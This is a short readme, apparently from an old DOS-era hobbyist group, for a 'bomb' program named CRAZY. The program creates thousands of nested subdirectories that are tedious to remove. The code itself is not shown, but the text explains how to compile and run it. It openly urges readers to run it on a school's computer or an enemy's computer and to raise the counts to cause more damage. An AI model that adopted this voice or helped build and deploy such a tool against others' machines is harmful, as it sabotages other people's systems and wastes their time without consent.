 This program was designed by Ninja Wala from SUP


   Now, you must remember this : DON'T RUN THIS PROGRAM ON YOUR HD, or you'll
   be long time dead, this is not a virus, this is a bomb !

   Program code is pretty straight forward, you can compile it with any version
   of Turbo C or Microsoft C ( change the dir.h into direct.h ), or you can
   copy this program into your own source as a routine. piece of cake.

   There isn't any big skill in this program, it's just an idea of joke,
   punishment or whatever, what this program do is it build 50 subdirectories
   and in each subdirectory build another 50 sundirectories, and there is NO
   utility can remove it, pctools will just crash or malfunction, and if you
   remove it by hand... hmm... let's say you'll spend a month in front of your
   computer typing RD ..... , RD..... RD ..... , and spitting dirty words at
   the same time, hehe.

   If you know nothing about C language, you can just take the EXE file and
   use it, just type CRAZY, and you'll be long time dead, so what you should
   do is do it at RAM disk or blank floppy disk, or your school's computer or
   your foe's computer, it will be really a mess....

   Change the value of 50 will give the owner of that computer a stroke.


P.S : If you already run CRAZY.EXE before you read this.... *ack* leave me
        E-mail, and we'll see what I can do.
